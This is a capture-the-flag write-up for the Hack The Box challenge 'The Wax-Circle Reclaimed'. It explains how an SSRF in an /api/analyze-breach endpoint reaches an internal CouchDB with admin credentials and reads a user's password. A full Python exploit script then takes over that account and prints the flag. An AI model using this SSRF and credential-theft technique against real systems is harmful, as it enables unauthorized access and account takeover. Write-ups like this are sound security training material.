# The Wax-Circle Reclaimed

```
Atop the standing stones of Black Fen, Elin lights her last tallow lantern. The mists recoil, revealing a network of unseen sigils carved beneath the fen’s grass—her sister’s old routes, long hidden. But the lantern flickers, showing Elin a breach line moving toward the heartstone. Her final task is not to seal a door, but to rewrite the threshold. Drawing from years of etched chalk and mirror-ink, she weaves a new lattice of bindings across the stone. As the Hollow King approaches, she turns the boundary web inward—trapping him in a net of his own forgotten paths.
```

We need to access flag via `/dashboard`, but we need to login as `elin_croft` first. Via `/api/analyze-breach` endpoint, we can access couchdb via SSRF. To read the `elin_croft` user, we can access `http://admin:waxcircle2025@127.0.0.1:5984/users/user_elin_croft` to get password. Then we can login and grab the flag:

```python
import requests
import json

#host = "http://127.0.0.1:80"
host = "http://64.226.86.52:30349"

session = requests.Session()

# login
r = session.post(
    host + "/login",
    data={
        "username": "guest",
        "password": "guest123",
    },
)

# access couchdb via /api/analyze-breach
# get user by id

r = session.post(
    host + "/api/analyze-breach",
    data={
        "data_source": "http://admin:waxcircle2025@127.0.0.1:5984/users/user_elin_croft",
    },
)

resp = json.loads(r.text)
data = json.loads(resp["data"])
print(data)

# login again
r = session.post(
    host + "/login",
    data={
        "username": data["username"],
        "password": data["password"],
    },
)

# access dashboard

r = session.get(
    host + "/dashboard",
)
print(r.text)
```

Flag: `HTB{w4x_c1rcl3s_c4nn0t_h0ld_wh4t_w4s_n3v3r_b0und_381b6948524940ab4035d251eb5f7387}`.
